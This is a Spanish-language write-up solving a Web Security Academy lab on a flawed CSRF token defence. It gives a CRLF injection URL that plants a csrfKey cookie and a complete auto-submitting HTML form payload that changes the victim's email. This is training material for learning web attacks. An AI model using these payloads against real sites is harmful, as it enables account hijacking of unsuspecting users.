En esta clase continuamos con la explotación de sistemas con defensas CSRF mal implementadas. El servidor emplea una cookie llamada ‘**csrfKey**‘ junto al token CSRF, pero esta cookie no está ligada a la sesión del usuario, por lo que es posible inyectarla en el navegador de la víctima aprovechando la funcionalidad vulnerable del buscador.

El ataque se desarrolla en dos fases:

- Inyección de la cookie ‘**csrfKey**‘ en el navegador víctima mediante una URL de búsqueda que fuerza al servidor a emitir un encabezado ‘**Set-Cookie**‘ reflejado.
- Envío del formulario CSRF con el token correspondiente, haciendo uso de la cookie previamente establecida.

Gracias a esto, conseguimos alterar la dirección de correo de la víctima sin que el servidor lo detecte como una acción ilegítima.

Este escenario demuestra cómo incluso mecanismos aparentemente robustos pueden ser burlados cuando no se integran correctamente con la lógica de sesión.

Solucion
Como veiamos en la otra imagen nosotro teniamos un SET-Cookie en la parte del send asi que lo que nosotros podriamos hacer es hacer un salto de lienar para obtener otro nuevo SET-COOKIE para ello en el codigo ascii podemos ver eso
![Pasted_image_20250723201619.png](Imagenes/Pasted_image_20250723201619.png)

asi que vamos a pasar esto para cambiarlo
(/?search=hola%20Set-Cookie:%20csrfKey=a )
![Pasted_image_20250723201727.png](Imagenes/Pasted_image_20250723201727.png)
asi que esto no lo vamos a llevar a decoder y ahi vamos a darle decoder y le ponemos URL y vamos agregar lo siguiente
(/?search=hola%0D%0ASet-Cookie:%20csrfKey=a) tuvimos que eliminar el %20 despues del hola
![Pasted_image_20250723202139.png](Imagenes/Pasted_image_20250723202139.png)
ahora lo vamos a suplantar por lo que teniamos  asi que podemos ver que si funciona el cambio
![Pasted_image_20250723202613.png](Imagenes/Pasted_image_20250723202613.png)
con todo obtenido vamos a obtener nuestro payload
lo primero copiamos el formulario
![Pasted_image_20250723202931.png](Imagenes/Pasted_image_20250723202931.png)
y en este caso vamos a cargar una imagen 
(<form class="login-form" name="change-email-form" action="https://0ab7002204eeb8ac820e6b560025005f.web-security-academy.net/my-account/change-email" method="POST">                          
    <input type="hidden" name="email" value="hola@tenso.com">
    <input required="" type="hidden" name="csrf" value="myxrfjEOa56IEtZMnXN2y8zGACc33wuI">
</form>

<img src="https://0ab7002204eeb8ac820e6b560025005f.web-security-academy.net/?search=/?search=hola%0D%0ASet-Cookie:%20csrfKey=iS9jYVco7XUk75csWMItrW4mpMoqQue8%3b%20SameSite=None" onerror="document.forms[0].submit()">)
![Pasted_image_20250723204922.png](Imagenes/Pasted_image_20250723204922.png)

basicamente en el primer csrf ponemos esto del wiener
![Pasted_image_20250723205010.png](Imagenes/Pasted_image_20250723205010.png)
y en el segundo ponemos esto 
![Pasted_image_20250723205036.png](Imagenes/Pasted_image_20250723205036.png)
pero aqui le vamos agregar algo (/?search=hola%0D%0ASet-Cookie:%20csrfKey=iS9jYVco7XUk75csWMItrW4mpMoqQue8%3b%20 SameSite=None)
![Pasted_image_20250723205116.png](Imagenes/Pasted_image_20250723205116.png)

